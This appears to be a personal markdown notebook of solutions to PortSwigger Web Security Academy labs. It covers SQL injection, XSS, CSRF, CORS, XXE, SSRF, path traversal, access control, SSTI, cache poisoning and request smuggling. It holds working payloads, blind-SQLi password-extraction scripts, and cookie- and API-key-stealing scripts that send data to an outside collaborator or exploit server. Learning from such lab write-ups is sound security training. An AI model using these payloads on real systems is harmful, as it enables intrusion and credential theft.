# PortSwigger labs

## SQL Injection

It allows an attacker to interfere with database queries and retrieve information he should not be able to access.
This can be done in various clauses, such as order by, where, having, like. It's important to visualize the current server-side query context by understanding the web app's functionality.

**Note: Filtering is usually done server side (WHERE clause)**

### First LAB

It's a web shop with various products and it can filter them by categories. The category value is directly inserted onto an SQL query in the `WHERE` clause.
The objective is to see every product. This can be done with this simple payload: ` ' OR 1=1 --`

### Second LAB

It's a web shop but I need to login as administrator. This can be done with a simple `WHERE` clause payload, as that's where the user input is inserted.
The payload is: `' OR 1=1 --`

If the result of the query is outputted in the response, then we can subvert that to retrieve other information from other tables with a UNION attack.
It allows us to execute one or additional SELECT clauses and append the results to the original set.

**Example**

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

**BUT**

```

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.

```

So, we need to figure out the number of columns in the original query to append a new query. This can be done with the order by keyword. We can order by the result-set column index.,

**Example**

`' ORDER BY 1`
`' ORDER BY 2`

until we reach an error which says column with index 3 is out of range for the given table.

We can also specify an arbitrary number of values in the new SELECT clause until we avoid the error.

`SELECT 1, 2, 3, 4...`
`SELECT NULL, NULL, NULL, NULL....`

### Third LAB

It's a web shop. We have another category parameter and we know its inserted in a `where` clause, the objective is to figure out the number of columns in the result set. As such, we do:

`' ORDER BY 1`. No error.
` ' ORDER BY 2`. There's no error until 4, which means it has 3 columns. According to the lab description, we must use the `NULL` technique to solve. So we do: `' SELECT NULL,NULL,NULL`

Generally speaking, we need to know which columns are being reflected to see the resulting set of the UNION query. We can do that by using a unique character in each value of the SELECT clause and see where that is reflected.

`'UNION SELECT 1,NULL,NULL`
`' UNION SELECT NULL,1,NULL`

### Fourth LAB

We need to combine the techniques portrayed earlier, so we insert in the category field: `' ORDER BY 2 -- `. No error. Increasing one more gives us an error, so we have 2 columns in the result set. Next, we see which ones can reflect text. We insert: `' UNION SELECT 'hello', 'hello2' --`. We see both of the fields reflect text, so we can just: `UNION SELECT username,password FROM users --`

### Fith LAB

Sometimes only one column is reflected, so we must concatenating the strings in order to see the output.

In this case, two are reflected but only one reflects text. First, we figure out which one with: `UNION SELECT 'random_text', NULL --` and `' UNION SELECT NULL, 'random_text' --`. We see the second column accepts text, so we place our payload there: `' UNION SELE T NULL,username||'~'||password FROM users --`

**Note: String concatenation is different with each SQL version**

We can query the database version in different ways depending on what type is being served.


### Sixth LAB

We use the techniques from before to figure out the columns in the result set and which one is being reflected. As such, the final payload is: `' UNION SELECT @@version, NULL -- -`

**Note:All SQL versions in the cheatsheet accept -- - as a comment**

Blind SQL injection happens when there is no input reflected on the HTTP response. To test this, an attacker needs to be ware of the output of the application - does the content-length change with different boolean sql logic? That is, the app returns data depending on the query, just not the data you asked for in the query.

### Seventh LAB

It's a blind SQLi, exploitable with the below script, because it looks for changes in the body, that take place if the query is true or not.

```

2:20 PM

import requests
import string

def main():
    password = ""
    for index in range(1, 21):
        for char in string.ascii_letters + string.digits:
            cookies = {"TrackingId":f"pcLJqgVbBsfqEax3' AND (SELECT SUBSTRING(password, 1, {index}) FROM users WHERE username='administrator')='{password}{char}", "session":"LJy9oeGMExJomNP7psWb31UBvNi3Vt6Q"}
            r = requests.get("https://0ada000e0444e88dc09a9948005700ad.web-security-academy.net/", cookies=cookies)
            if "welcome" not in r.text.lower():
                continue
            password += char
            print(password)
            index += 1
main()

```

### Eighth Lab

To solve the lab, we need to display the database version string.

We know we can use a UNION attack.

First we need to see how many columns there are, we do that with an order by query: `' ORDER BY 1 -- -`. When we get an error we know there are `current column number - 1` columns. Then we need to see which columns displays strings. We do that with: `' UNION SELECT 'abc','def' -- -`. The string reflected implies which column reflects. We know it's the first one, so we switch 'abc' for `@@version` and `'def'` for `NULL`and the lab is solved.

### Ninth Lab

First we need to find the name of the users table: `' UNION SELECT table_name, NULL FROM information_schema.tables -- -`. 

After, we find the name of the columns in that table: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=<found_table_name>`

Then we simply fetch username and password with our attained knowledge.

`' UNION SELECT <found_username_column_name>, <found_password_column_name FROM <found_table_name> -- -`

We log in and the lab is solved.

### Tenth Lab

We repeat the same logic but with table_name in the first select and all_tables as the table: `' UNION SELECT table_name,NULL FROM all_tables--`, then we do: `'  UNION  SELECT  column_name,NULL  FROM  all_tab_columns  WHERE  table_name='USERS_ABCDEF'--`. Finally we use the attained information to construct a query:
`'   UNION   SELECT   USERNAME_ABCDEF,   PASSWORD_ABCDEF   FROM   USERS_ABCDEF--`

### Eleventh Lab

Simply use this script which uses the case when condition and string concatenation to induce conditional errors based on a given character of the password being correct.

```
import string
import requests
import string

payload = ""
count = 1

while count <= 30:
    for char in string.ascii_letters + string.digits:
        r = requests.get(f"https://0a8d001c0488b738c0eda475002f00cb.web-security-academy.net/", cookies={"TrackingId":f"FqkZypIERiKR57Km'||(SELECT CASE WHEN(SUBSTR(password,1,{count})='{payload}{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'", "session":"EqyCUGiM2rYeDvhPu8Js9o1I2sB0ZTDK"})
        if r.status_code != 500:
            continue
        payload += char
        print(f"{payload}\nStatus Code: {r.status_code}")
        count += 1
        break

```
### Twelth LAB

Simply induce a time delay in the tracking cookie: `x'||pg_sleep(10) -- -`

### Thirthinth LAB

Retrieve information with this script but remember to switch the url for your lab id.

```
import requests
import string

def main():
    index = 1
    password = ""
    while index <= 30:
        for char in string.ascii_letters + string.digits:
            r = requests.get("https://0a5a004b0438160bc046d73800e60088.web-security-academy.net/", cookies={"TrackingId":f"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,{index})='{password}{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"})
            if r.elapsed.total_seconds() < 10:
                continue
            password += char
            index += 1
            print(password)
            break

main()

```

## XSS 

Occurs when user unvalidated user input is reflected onto the html. An attacker can then inject arbitrary tags, some of which leads to js execution, thus arises cross site scripting.

XSS is split into three categories:

**Reflected XSS** - it's not stored, the reflection occurs only in the subsequent response to the request.

**Stored XSS** - It's stored somewhere, so the reflection is present even if we close the page and re-open it.

**DOM XSS** - Takes place when user input is placed on a sink that allows execution of js.

**MAIN SINKS**

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```
**MAIN jQuery Sinks**

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

### Reflected XSS LAB 1

There's no encoding, so all we need to do is insert the most common payload of all - `<script>alert(1);</script>`

### Reflected XSS LAB 2

Angle brackets are html encoded, so we can't escape the tag context, therefore we need to append an event handler attribute. The final payload to be inserted in the search box is: `" autofocus="" onfocus="alert()`

### Reflected XSS LAB 3

Our input is inserted directly onto js context, so we can simply close the string with quote, subtract our alert() payload from that and subtract to another opening quote: `'-alert()-'`

### Stored XSS LAB 1

There's no encoding, so all we need to do is insert the most common payload of all - `<script>alert(1);</script>`

### Stored XSS LAB 2

Our input is reflected inside an href a tag attribute of the website input, as such, we can simply inject `javascript:alert()`.

### DOM XSS LAB 1

There's no encoding, so all we need to do is insert the most common payload of all - `<script>alert(1);</script>`

### DOM XSS LAB 2

We can't inject tags that execute XSS inside `<select>, we close it first. Meaning the final payload is: `"></select><img+src="x"+onerror="alert()">`

###DOM XSS LAB 3

We can't inject `<script>` or `<svg>`  inside document.write, so we inject: `<img src=x onerror=alert()>`

### DOM XSS Lab 4

In this case, we have jquery changing the attribute value of an html tag with `attr`:

```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});

```

As such, we can simply use javascript:alert(document.cookie in returnUrl) to solve this lab.

### DOM XSS LAB 5

This one utilizes the selector sink with window.location.hash:

```
$(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });

```
**VULNERABLE SNIPPET**:

`var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');`

The `$()` selector sink can inject malicious objects onto the DOM, as such, if we craft a payload like: `#<img src=/ onerror=print()>`, a print page will pop up.

With that in mind, we can deliver this exploit to the victim:

`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">` It loads the iframe with that given src and when it loads, appends an xss payload to that src.

### XSS to steal cookies

Use burpcollborator to steal the admin's cookies via an XSS at post comment section.

```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

```

## Authentication

Its the action of verifying the identity of a given user. It's making sure they are who they claim to be.

**Authentication is the process of verifying that a user really is who they claim to be, whereas authorization involves verifying whether a user is allowed to do something.**

Username enumeration occurs when there's a way to distinguish a failed login attempt from a login attempt with a correct username. It can be response length, time of response, or simply a message such as "There's no username like that in our database."

### Lab 1

In this LAB, the developer decided to write a message when the username is wrong and when the password doesn't match. With that in mind, we can construct a payload list that iterates over usernames until it finds the "Incorrect password",  and then iterate over the password list until it doesn't say "Incorrect password". Basically, an attacker is able to deduce the account credentials by analyzing the responses given to him.

username: **arcsight**

password: **hunter**

### LAB 2

This 2FA bypass is fairly simple. Merely login as carlos montoya and when promped for the 2fa code, issue a get request to /my-account. Notice you are logged in.

### LAB 3

Issue a password reset link from the account wiener, go to email client, click the link, set a new password and click update with intercept on. Notice a POST is sent with a username, change it to carlos, send the request and login to that account with the new password.

## CSRF

CSRF Request forgery takes place when there is an action to be made and cookie based session handling.

Example (assume cookie based session handling)

`GET /change-email?email=example@example.com HTTP/2`

This can be crafted onto a URL that is sent to the victim, which, when clicked, changes its email.

### CSRF Lab 1

Simply send the following to the body of the /exploit url inside the lab

```
<form method="$method" action="$url">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
        document.forms[0].submit();
</script>

```
Change $method to to POST.

Change $action to the my-account/change-email

Change $param1name to email

Change $param1value to an email value.

Deliver the exploit.

### Cors

CORS is a defense mechanism that prevents websites from attacking each other.

It basically says: Any website with this given origin can talk to me, any other can't.

It does that by comparing headers, Origin and Access-Control-Allow-Origin. If they match, then the request is sent.

You can't use credentials if the origin is a wildcard.

For Access-Control-Allow-Credentials to be true, the Access-Contol-Allow-Origin needs to to not be a wildcard, that is, it needs to be a domain or a group of domains. You can't have *.domain.com as Origin.

Sometimes developers go the easy way out and code that any request's to their server will be allowed, by simply reflecting the Origin header's value into Access-Control-Allow-Origin.

### CORS LAB 1

In this case, the origin header is reflected in the server and credentials are allowed.
We craft a CORS requests like this:

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>

```
replacing the $url with our unique id lab. We store, deliver exploit to victim and click see exploit. We notice the api key of the administrator account is in there, and that is the key to solve the lab.

### CORS LAB 2

Origin header value can be null, and the server can accept that in the following conditions:

```

    Origins whose scheme is not one of http, https, ftp, ws, wss, or gopher (including blob, file and data).
    Cross-origin images and media data, including that in <img>, <video> and <audio> elements.
    Documents created programmatically using createDocument(), generated from a data: URL, or that do not have a creator browsing context.
    Redirects across origins.
    iframes with a sandbox attribute that doesn't contain the value allow-same-origin.
    Responses that are network errors.
    
```

So, in our case, we craft a sandboxed iframe payload.

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>

```
Replace $url with the unique lab url.

Replace $exploit-server-url with the unique exploit server url.

## XXE

XML External Entity allows an attacker to interfere with application's processing of XML data. It can alllow to view files, interact with systems the app is able to access. It might be leveraged for SSRF.

### XXE LAB 1

It's fairly simple. Whilst checking the stock of a product, the client queries the server with XML. Thus:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

```

### XXE LAB 2

Same logic, but we replace file:// with http://169.254.169.254/latest/meta-data/iam/security-credentials/admin, thus:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

```
## SSRF - Server Side Request Forgery

It happens when the server makes a request to an arbitrary server, which can even be itself. If the server allows it, we can use, for example, the file:/// directive to whatever file we want the server to fetch, and the server should return that in the response, if its not a blind SSRF.

### SSRF LAB 1

The server sends a request to another server to fetch the stock data, as such we only need to replace the server payload with ours:

```
http://localhost/admin/delete?username=carlos

```
### SSRF LAB 2

We know there's another internal server which is capable of running admin functions, so we brute-force the last octet of the given IP, appending the url path to do the admin action:

```
http%3A%2F%2F192.168.0.x%3A8080/admin/delete?username=carlos

```

## Directory Traversal

It occurs when a file is programatically opened with the filename being user input. For example, in python, `open(userinput)` can lead to this.

An attacker, if the input isn't properly validated, can simply append a payload that traverses through the path, such as: `../../../etc/passwd`. This allows an attacker to see the etc/passwd file,  because .. in Linux means to go back one directory.

### Directory Traversal LAB 1

A filename parameter is used to fetch images, we replace the image name with: 

`../../../etc/passwd` and the password file is show.


## Access Control 

Authorization is the process of determining if a given user can perform the requested actions or access resources.

It can be vertical, horizontal or context dependant.

Vertical access control mechanisms restrict access to sensitive functionality that is not available to other types of users.

**For example, an administrator might be able to modify or delete any user's account, while an ordinary user has no access to these actions**

Horizontal access control mechanisms restrict access to resources to users who are specifically allowed to access those resources.

**For example, a banking application will allow a user to view transactions and make payments from their own accounts, but not the accounts of any other user** 

Context dependant access control mechanisms restrict access to resources based on a user's interaction with them.

**For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment**

### Access Control LAB 1

We need to delete a user knowing there is unprotected admin functionality. We go to robots.txt looking for that and find the endpoint: `administrative-panel`. We go to it and see we can access all admin functions, such as delete user. We delete the user required to complete the lab

### Access Control LAB 2

Same logic, but this time exists an admin panel with an unpredictable url generated by js. We open the source code and see the url lying there. Open that url and delete the user required to complete the lab.

### Access Control LAB 3

This time a user role is set by the cookie Admin=true|false after logging in. So we log in.

We need to get admin, so we set the cookie Admin=false to true after logging in.

### Access Control LAB 4

We know there's a parameter called roleid which when changed to 2 gives us admin. We open burpsuite, enter the lab and notice we can change our roleid in the profile. We set a valid email. Start intercept, click update email and change the request to include "roleid":2. We forward it and notice we are admin by clicking on the Admin-Panel link that appeared.

### Access Control LAB 5

This time, when we log in, we can see the id GET parameter in the url pointing to the current user. Thus, we need only change it to carlos and we are now in carlos's account. Copy his api key and submit it as the solution.

### Access Control LAB 5

This time, the user-id is unpredictable, nonetheless, we can see it visiting the given user's page. As such, we visit carlos's page and copy the uuid in the get parameter. We login to our account and replace the uuid with carlo's. Copy and paste the api key in the solution.

### Access Control LAB 6

The response is a redirect but the backend doesn't remove the body, so we can see the results of our request anyway. We log in, go to my account, send that request to burpsuite repeater, add an ?id=carlos query-string to the url and get the api key. Paste it as the solution.

### Access Control LAB 7

We can change the user id to administrator in my account page after logging in. Send that request to burpsuite, look for the administrator password in the source code. Log in as administrator, dele the user carlos.

### Access Control LAB 8

We go login to our account, wiener:peter and go to live chat. We send a message and click get transcript. We notice it's getting an endpoint that fetches 2.txt. We change it to 1 and see the password there.

## Insecure deserialization

Serialization is the process of converting data structures such as objects into something that can be sent and received like a stream of bytes. Basically you use it to save the object's state.
Deserialization is the process of restoring this stream of bytes to its original state.
Insecure deserialization occurs when user input is deserialized.

### Insecure deserialization LAB 1

We login with account `wiener:peter`. We open our browser's dev tools. We notice we receive a cookie whose value we decode and notice it is a php serialized object. The `admin`attribute contains a boolean value set to false. We set it to true by replacing 0 with 1. Encode the cookie. We now have access to the admin panel. Go there and delete user `carlos`.

## Information Disclosure.

It's the process of discovering sensitive (or not) information that the website unintentionally discloses to the user.

### Information Disclosure LAB 1

We click to see any arbitrary product and notice it has an id parameter which expects an int. We providade it an arbitrary string such as: `"hello"`and notice it spews out information. The apache version is the challenge.

### Information Disclosure LAB 2

We open the source-code of the home page and scroll through the comments. We notice one called `debug`. It points to `/cgi-bin/phpinfo.php`. We go there and find `SECRET_KEY`. It is the solution for the lab.

### Information Disclosure LAB 3

We browse to a directory called `/backup/` and it has directory listing set. We click on the only file there. On the source-code, there's a password for a `postgres` database. It is the solution.

### Information Disclosure LAB 4

We browse to `/admin` and notice we need a local IP to view the panel. We `TRACE` admin and see the header: `X-Custom-IP-Authorization`. We set it in our request to `/admin` with value: `127.0.0.1` We send a request to the page and open it in our browser and delete user `carlos`.

## Business Logic Vulnerabilities

Arise when developers assume an end user will interact a certain way but interacts in another, unintended way, leading to unintended behaviour by the web application (so called logic-flaws).

### Business logic vulnerabilities LAB 1

This time, the developer assumed a user would only use the browser to make requests, he placed excessive trust in client side controls. This mean we can simply craft a request which changes the `price`parameter to 1, and we will buy that item for that price.

Simply open burpsuite, set intercept on. View details on the 1337 l34th3r j4ck3t, click order, change price to 1, go to your cart and order it. The lab is solved.

## Server Side Template Injection


Occurs when user input is directly concatenated to the template renderer instead of being passed in as data in the appropriate fields. It leads to server-side RCE.

### SSTi LAB 1

We need to pop RCE knowing it's ERB template. The objective is to delete morale.txt. That's fairly simple, call system function.

Final payload: `<%= system('rm morale.txt') %>`

## Web Cache Poisoning

Between the client and the server lays a cache, it uses keyed input, that is, parts of the http request, to determine if a cached request will be served. The logic is as follows: If the keyed input in the http request matches the keyed input cached, then a cached request is served. Otherwise, it is forwarded to the server.

### Web Cache Poisoning LAB 1

We send two GET requests to `/?cb=1234` and notice the second one's response displays a header: `X-Cache: hit`, implying the cache served us a response. In order to be served by the cache, we only need to send a request, and the next request (if it has the same keyed input) is served by the cache. The object is to pop an alert via X-Forwarded-Host.

Add that header with an arbitrary host value, such as example.com, and send the request. Copy the path of the absolute url it generates. Go the exploit serve and change the filename to that, in the body write `alert(document.cookie)` and store the exploit. Go back to the previous GET request but remove the query-string. Substitute the arbitrary X-Forwareded-Host value to your exploit-lab url. Send the request until the `hit` displays again. If the lab is not solved, re-send the request every few seconds until it is.

### Web Cache Poisoning LAB 2

We need to pop an alert(1) through the cookie. First we add a cache buster such as: `?cb=1234` and figure out which cookie is being reflected. It's fehost, so we add to it: `"-alert(1)-"`. We remove the cache buster, therefore sending that request to `/`. When we get a `X-Cache: hit` header, copy the url and paste it in the browser. The alert is popped, lab is solved.


## Request Smuggling

Is the process of sending a smuggled request inside another request. This arises when there are multiple servers before reaching the ultimate backend server. Imagine a situation where the frontend server uses Content-Length to discern where the body ends, but the backend server uses Transfer-Encoding:

The frontend will forward the entire request to the backend, due to the matching content-length, but the backend server will see a chunk size of 0, implying the transfer encoding request is over. However, since the frontend server forwarded the whole request, there are still bytes left unprocessed, which due to the nature of the http protocol, will be seen as the next HTTP request.

CL-TE:

### LAB 1

```

POST / HTTP/1.1
Host: 0af7005004fa2008c0e7414d00480036.web-security-academy.net
Cookie: session=q4YcBH0UA9IiP3stGRgZQhwFCOXFSUBi
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
tRANSFER-ENCODING: chunked


0

G

```
TE-CL:

### LAB 2

It's the same logic: Frontend forwards the entire request, backend only see's some of it, the rest is left unprocessed and will be seen as the next HTTP request.
Front end see's the request until the 0 byte, backend only see's the request until what content-length allows. Solutin:

```

POST / HTTP/1.1
Host: 0a3e00eb042b50ccc0fb12c9008d003b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
0

```

TE-TE:

Make one of the servers not process the TE header in some way.

### LAB 2

```

POST / HTTP/1.1
Host: 0a48004d04017b53c0a8806e00fd0057.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```